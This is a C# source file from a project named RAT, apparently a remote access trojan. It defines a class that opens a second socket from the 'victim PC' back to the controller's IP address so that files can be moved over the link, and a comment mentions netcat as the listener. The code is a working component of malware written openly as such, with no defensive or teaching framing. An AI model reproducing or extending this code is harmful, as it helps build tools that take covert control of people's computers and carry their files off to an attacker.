using RAT.src.Interfaces;
using System;
using System.Net;
using System.Net.Sockets;

namespace RAT.src.Logic.Sockets.Connection
{
    /// <summary>
    /// Logic for making connections to sockets.
    /// </summary>
    public class SocketConnectionConnectLogic : ISocketConnectionConnectLogic
    {
        private readonly ISocketStateLogic _stateLogic;
        private readonly ISocketConfigurator _socketConfigurator;
        private readonly IClientNotificationLogic _notificationLogic;

        /// <summary>
        /// Logic for making connections to sockets.
        /// </summary>
        /// <param name="state">Sockets/clients current state.</param>
        /// <param name="socketConfigurator">Stores configurations for sockets.</param>
        /// <param name="notificationLogic">Logic for client notifications.</param>
        public SocketConnectionConnectLogic(
            ISocketStateLogic state,
            ISocketConfigurator socketConfigurator,
            IClientNotificationLogic notificationLogic)
        {
            _stateLogic = state;
            _socketConfigurator = socketConfigurator;
            _notificationLogic = notificationLogic;
        }

        /// <summary>
        /// Gets configured and connected socket for file downloads.
        /// </summary>
        /// <returns>Configured socket for file downloadds.</returns>
        public Socket GetConnectedSocketForFileDownload()
        {
            Socket socketForFileDownload = _stateLogic.State.ClientFileDownloadSocket;
            if (socketForFileDownload != null && socketForFileDownload.Connected)
            {
                return socketForFileDownload;
            }

            // We will create new socket for file downloading, not to cause mess and reuse the main one.
            // Also netcat is not working with file download if socket is being reused
            // Let's keep everything clean :)
            var remoteIp = (_stateLogic.State.ClientSocket.RemoteEndPoint as IPEndPoint).Address;
            IPEndPoint remoteEndPoint = _socketConfigurator.GetRemoteEndpointConfigurationForFileDownloadSocket(remoteIp);
            socketForFileDownload = _socketConfigurator.GetConfiguredSocket();

            // Trying to establish connection from victim PC.
            this.BeginFileSocketConnect(socketForFileDownload, remoteEndPoint);

            return socketForFileDownload;
        }

        /// <summary>
        /// Wrapper for BeginConnect method.
        /// </summary>
        /// <param name="socket">Socket for file downloads.</param>
        /// <param name="endPoint">Endpoint with which socket should be connected.</param>
        public void BeginFileSocketConnect(Socket socket, IPEndPoint endPoint)
        {
            try
            {
                _stateLogic.State.ClientFileDownloadSocket = socket;
                socket.Connect(endPoint);
            }
            catch (Exception exception)
            {
                _notificationLogic.NotifyClient($"\nError during connection for file socket: {exception.Message}\n");
            }
        }
    }
}